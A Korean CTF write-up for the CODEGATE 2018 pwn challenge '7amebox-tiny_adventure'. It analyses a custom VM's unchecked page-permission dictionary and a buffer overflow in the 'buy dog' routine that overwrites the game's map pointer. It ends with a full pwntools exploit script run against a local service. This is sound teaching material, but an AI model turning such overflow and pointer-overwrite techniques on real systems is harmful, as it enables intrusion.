---
title: "[HS2024] [CODEGATE 2018] 7amebox-tiny_adventure Write-up"
date: 2024-08-01 19:30:00 +0900
categories: [WRITE-UP, PWN]
tags: [hs2024, codegate, ctf, pwn, 7amebox, vm]     # TAG names should always be lowercase
---

# 7amebox-tiny_adventure Write-up

2018 Codegate 본선 문제인 7amebox-tiny_adventure 문제 write-up.

## 1. Environment
- Ubuntu 16.04
- Python 2.7
```
.
├── Dockerfile
├── _7amebox_patched.py
├── flag
├── mic_check.firm
├── run.sh
└── vm_name.py
```

Emulator에 대한 분석 및 도구들은 (7amebox-name Write-up)[https://popjy0312.github.io/posts/7amebox-name/] 에서 확인 가능하다.

## 2. 바이너리 분석

프로그램을 실행하면 4개의 메뉴가 주어진다.

1. show current map
    - 현재 map의 상태가 출력된다.
2. buy a dog
    - dog를 구매 할 수 있다.
3. sell a dog
    - dog를 판매 할 수 있다
4. direction help
    - 방향에 대한 설명이 출력된다.

그리고 `w`, `a`, `s`, `d` 입력을 통해 내 현재 위치를 이동 할 수 있다.

```
-------------------------------------------------
* (\x2a)      = power up
# (\x23)      = wall
@ (\x40)      = you
a ~ y         = monster
z             = boss monster (flag)
-------------------------------------------------

##############################################################
#@                                                           #
#                                     a  f                   #
#                                                            #
#   v            z                                           #
#                     i            p                         #
#                                                            #
#                                                            #
#                                                            #
#d                                                           #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#                    t                                       #
#                                                    b       #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#                                                           y#
#                                                            #
#                   h                                        #
#                                                            #
#                    m                                       #
#                                                            #
#                                                            #
#          c                                                 #
#                                                            #
#                         j                                  #
#                                                            #
#                                                            #
#                                                            #
#                                                    n       #
#                                                            #
#                                                            #
#                            k                               #
#                   l                                        #
#  g                                                         #
#                                                            #
#                                                x           #
#                                                            #
#            q                u                              #
#                                                            #
#                                                            #
#     r                                                      #
#                                                            #
#                                          s                 #
#                                                            #
#                                                            #
#                                                            #
#     e                                                      #
#                           o                                #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#                                                            #
#         w                                                  #
##############################################################
```

map을 살펴보면 `a`부터 `z`까지 보스들이 존재하고, 보스와 조우하면 보스와 싸우게 되며 내 현재 체력 상태에 따라 승패가 결정된다.

`z` 보스를 만나고 승리하면 flag를 획득 할 수 있다.

## 3. 취약점 분석

### 3.1. Add items on pages dictionary

`pages` dictionary에 할당 할 수 있는 page 목록이 저장돼있는데, 이 dictionary에 들어있는 item수를 늘릴 수 있다.

```python
def set_perm(self, addr, perm):
    self.pages[addr & 0b111111111000000000000] = perm & 0b1111
```

Emulator의 `set_perm` 함수를 살펴보면, key값이 해당 dictionary에 존재하는지에 대한 검증이 없기 때문에, key에 없는 주소값에 대해 들어오면 `pages` dictionary에 새로운 item이 추가된다.

### 3.2. Buffer Overflow

`buy_dog`를 0x100번 이상 수행하면 게임 정보가 담겨있는 구조체를 덮을 수 있다.

```
buy_dog():
    025c : 19 30           | push     bp
    025e : 11 3c           | mov      bp, sp
    0260 : 2f 40 06 00 00  | sub      sp, 0x6
    0265 : 12 20 06 00 00  | mov      r2, 0x6
    026a : 10 5b           | mov      r5, bp
    026c : 2e 50 03 00 00  | sub      r5, 0x3
    0271 : 10 15           | mov      r1, r5
    0273 : 12 00 04 00 00  | mov      r0, 0x4
    0278 : 20 00           | syscall            ; alloc(bp-3, 'rw')
    027a : 5e 00 00 00 00  | cmp      r0, 0x0
    027f : 6f 50 70 00 00  | je       pc, 0x70  ; 02f4 too many dogs
    0284 : 10 5a           | mov      r5, r10
    0286 : 00 65           | load     r6, r5
    0288 : 44 60           | inc      r6
    028a : 08 65           | store    r6, r5
    028c : 3e 60 03 00 00  | mul      r6, 0x3
    0291 : 24 6a           | add      r6, r10
    0293 : 10 5b           | mov      r5, bp
    0295 : 2e 50 03 00 00  | sub      r5, 0x3
    029a : 00 55           | load     r5, r5
    029c : 08 56           | store    r5, r6
    029e : 12 00 67 00 17  | mov      r0, 0xbe7 ; do you want
    02a3 : 7b 50 7d 00 07  | call     pc, 0x3fd ; print(buf)
    02a8 : 12 10 03 00 00  | mov      r1, 0x3
    02ad : 10 5b           | mov      r5, bp
    02af : 2e 50 06 00 00  | sub      r5, 0x6
    02b4 : 10 05           | mov      r0, r5
    02b6 : 7b 50 2e 00 07  | call     pc, 0x3ae ; gets(bp-6, 3)
    02bb : 10 5b           | mov      r5, bp
    02bd : 2e 50 06 00 00  | sub      r5, 0x6
    02c2 : 54 66           | xor      r6, r6
    02c4 : 04 65           | load7    r6, r5
    02c6 : 62 60 79 00 00  | cmp7     r6, 0x79  ; y
    02cb : 73 50 15 00 00  | jne      pc, 0x15  ; 02e5 got new dog
    02d0 : 12 10 00 00 20  | mov      r1, 0x1000
    02d5 : 10 5b           | mov      r5, bp
    02d7 : 2e 50 03 00 00  | sub      r5, 0x3
    02dc : 00 65           | load     r6, r5
    02de : 10 06           | mov      r0, r6
    02e0 : 7b 50 04 00 07  | call     pc, 0x384 ; gets(bp-3, 0x1000)
    02e5 : 12 00 18 00 18  | mov      r0, 0xc18 ; got new dog
    02ea : 7b 50 36 00 07  | call     pc, 0x3b6 ; print(buf)
    02ef : 77 50 0a 00 00  | jmp      pc, 0xa
    02f4 : 12 00 45 00 18  | mov      r0, 0xc45 ; too many dogs
    02f9 : 7b 50 27 00 07  | call     pc, 0x3a7 ; print(buf)
    02fe : 11 4b           | mov      sp, bp
    0300 : 1d 30           | pop      bp
    0302 : 1d 50           | pop      pc
```

alloc 함수가 실패하지 않는 한 계속해서 buy dog를 수행 할 수 있다.
alloc 함수는 pages dictionary에서 item을 하나씩 할당해준다.

0x1000 에서부터 3바이트씩 구매한 dog 데이터가 들어있는 주소값이 저장된다.

그런데, 0x1300에는 아래와 같이 dog의 수, 지도정보의 주소가 담긴 포인터 등이 존재한다.

```c
    |struct {
1300|   word dog_cnt;
1303|   byte* map; ( 0x059000 )
1306|   word sell_ticket = 6;
1309|   word power = 0x78;
130c|   word target = 0x61;
130f|   word x = 0;
1312|   word y = 0;
    |}
```

따라서 0x100 마리 이상의 dog를 구매하면 이 주소를 덮을 수 있다.

## 4. Exploit 전략

Exploit을 하기 위한 전략.
1. sell_dog를 6번 수행해서 pages dictionary의 크기를 늘린다.
2. buy_dog를 0x101번 수행해서 지도 주소에 해당하는 포인터를 덮는다.
3. 지도에 powerup인 '*'을 잔뜩 깔고 'z'를 깔아서 boss전 승리.

## 5. Result

exploit을 수행한 결과 아래와 같이 shell을 획득할 수 있다.

![exploit success](/assets/img/posts/HS2024-1/7amebox-tiny_adventure/exploit_success.png)

### Full exploit code

```python
#!/home/gg/.ctf/bin/python3
from tools.utils import *

from pwn import *


context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'

HOST, PORT = '127.0.0.1 8103'.split(' ')

def buy_dog(data = None):
    global p
    p.sendlineafter(b'>', b'2')
    print(p.recvline())
    if not data:
        p.sendlineafter(b'>', b'n')
        print(p.recvline())
    else:
        p.sendlineafter(b'>', b'y')
        p.sendline(data)

def sell_dog(addr):
    global p
    p.sendlineafter(b'>', b'3')
    print(p.recvline())
    p.sendlineafter(b'>', addr)
    print(p.recvline())

if __name__ == '__main__':
    global p
    p = remote(HOST, PORT)

    sell_dog(b'\x00\x41\x20')   # 0x105000
    sell_dog(b'\x00\x41\x40')   # 0x106000
    sell_dog(b'\x00\x41\x60')   # 0x107000
    sell_dog(b'\x00\x42\x20')   # 0x109000
    sell_dog(b'\x00\x42\x40')   # 0x10a000
    sell_dog(b'\x00\x42\x60')   # 0x10b000
    for i in range(0x100):
        buy_dog()
    
    width = len('@                                                           ')
    buy_dog(b'*'*width * 5 + b'z')

    for j in range(5):
        for i in range(width):
            p.sendlineafter(b'>', b'd')    
        p.sendlineafter(b'>', b's')
    p.interactive()
```